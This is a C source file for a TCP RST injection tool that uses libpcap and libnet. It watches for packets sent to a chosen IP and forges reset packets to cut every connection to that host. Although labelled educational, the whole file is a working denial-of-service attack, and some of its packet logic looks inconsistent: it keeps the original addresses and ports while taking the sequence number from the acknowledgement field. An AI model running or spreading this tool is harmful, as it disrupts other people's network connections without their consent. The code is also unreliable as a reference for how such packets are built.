/*
 * TCP RST Injection Tool
 * 
 * This tool resets all TCP connections to a given target IP using libnet and pcap.
 * For educational and research purposes only.
 */

#include <pcap.h>
#include <libnet.h>
#include "Fatal.h"

// Structure to pass data to the packet handler
struct data_pass {
    unsigned char *packet;
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l;
};

// Function prototypes
void caught_packet(u_char *user, const struct pcap_pkthdr *cap_header, const u_char *packet);
int set_packet_filter(pcap_t *pcap_handler, struct in_addr *target_ip);

int main(int argc, char *argv[]) {
    struct pcap_pkthdr cap_header;
    const unsigned char *packet, *pkt_data;
    pcap_t *pcap_handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *device;
    int network;
    unsigned int target_ip;
    struct data_pass critical_libnet_data;
    pcap_if_t *alldevs;

    // Check arguments
    if (argc < 2) {
        printf("[Usage]--> %s <target_ip_address>\n", argv[0]);
        exit(1);
    }

    // Find available devices
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
        fatal(errbuf);

    if (alldevs == NULL)
        fatal("No devices found");

    device = alldevs->name;

    // Initialize libnet in RAW4 mode
    critical_libnet_data.l = libnet_init(LIBNET_RAW4, device, critical_libnet_data.errbuf);
    if (critical_libnet_data.l == NULL)
        fatal(critical_libnet_data.errbuf);

    // Resolve target IP
    target_ip = libnet_name2addr4(critical_libnet_data.l, argv[1], LIBNET_RESOLVE);
    if (target_ip == -1)
        fatal("in libnet_name2addr4");

    // Open pcap handle
    pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
    if (pcap_handle == NULL)
        fatal(errbuf);

    libnet_seed_prand(critical_libnet_data.l);

    // Set packet filter for target IP
    set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

    printf("resetting all connection to %s on %s \n", argv[1], device);

    // Start packet loop
    pcap_loop(pcap_handle, -1, caught_packet, (unsigned char *)&critical_libnet_data);

    // Cleanup
    pcap_close(pcap_handle);
    libnet_destroy(critical_libnet_data.l);
}

// Sets the packet filter to capture only ACK packets for the target IP
int set_packet_filter(pcap_t *pcap_handler, struct in_addr *target_ip) {
    struct bpf_program filter;
    char buffer[100];

    // Filter: TCP packets with ACK flag set, destined for target IP
    sprintf(buffer, "tcp[13] & 16 != 0 and dst host %s", inet_ntoa(*target_ip));
    printf("[Debug] our packet filter is : %s\n", buffer);

    if (pcap_compile(pcap_handler, &filter, buffer, 0, 0) == -1)
        fatal("pcap_compile failed");

    if (pcap_setfilter(pcap_handler, &filter) == -1)
        fatal("pcap_setfilter failed");
}

// Handler for each caught packet - sends a RST to reset the TCP connection
void caught_packet(u_char *user, const struct pcap_pkthdr *cap_header, const u_char *packet) {
    struct libnet_ipv4_hdr *IPhdr;
    struct libnet_tcp_hdr  *TCPhdr;
    struct data_pass *passed;
    int bcount;
    libnet_ptag_t iptag, tcptag;
    u_int32_t seq, ack;
    uint16_t ip_header_len, tcp_header_len, payload_len;

    passed = (struct data_pass *)user;

    // Extract IP and TCP headers from packet
    IPhdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);
    ip_header_len = IPhdr->ip_hl * 4;
    TCPhdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + ip_header_len);
    tcp_header_len = TCPhdr->th_off * 4;
    payload_len = cap_header->caplen - (LIBNET_ETH_H + ip_header_len + tcp_header_len);

    // Calculate sequence and acknowledgment numbers for RST packet
    seq = ntohl(TCPhdr->th_ack);
    ack = ntohl(TCPhdr->th_seq) + payload_len;

    printf("resetting TCP connection from %s:%d ",
           inet_ntoa(IPhdr->ip_src), ntohs(TCPhdr->th_sport));
    printf("<---> %s:%d\n",
           inet_ntoa(IPhdr->ip_dst), ntohs(TCPhdr->th_dport));

    // Clear any previous packet in libnet context
    libnet_clear_packet(passed->l);

    // Build TCP RST packet
    tcptag = libnet_build_tcp(
        ntohs(TCPhdr->th_sport),                      // Source port
        ntohs(TCPhdr->th_dport),                      // Destination port
        seq,                                          // Sequence number
        ack,                                          // Acknowledgment number
        TH_RST,                                       // TCP flags (RST)
        libnet_get_prand(LIBNET_PRu16),               // Window size
        0,                                            // Checksum (0 = autofill)
        0,                                            // Urgent pointer
        LIBNET_TCP_H,                                 // Length of TCP header
        NULL,                                         // No payload
        0,                                            // Payload length
        passed->l,                                    // libnet context
        0                                             // Protocol tag
    );

    // Build IP header for RST packet
    iptag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H,                 // Total length
        IPTOS_LOWDELAY,                               // Type of service
        libnet_get_prand(LIBNET_PRu16),               // Identification
        0,                                            // Fragmentation
        libnet_get_prand(LIBNET_PRu16),               // TTL
        IPPROTO_TCP,                                  // Protocol
        0,                                            // Checksum (0 = autofill)
        IPhdr->ip_src.s_addr,                         // Source IP
        IPhdr->ip_dst.s_addr,                         // Destination IP
        NULL,                                         // No payload
        0,                                            // Payload length
        passed->l,                                    // libnet context
        0                                             // Protocol tag
    );

    // Write the packet to the wire
    bcount = libnet_write(passed->l);
    if (bcount == -1) {
        fatal("in libnet_write");
    } else if (bcount < LIBNET_IPV4_H + LIBNET_TCP_H) {
        printf("Warning incomplete packet written!!!\n");
    }

    // Sleep to avoid overwhelming the network
    usleep(5000);
}
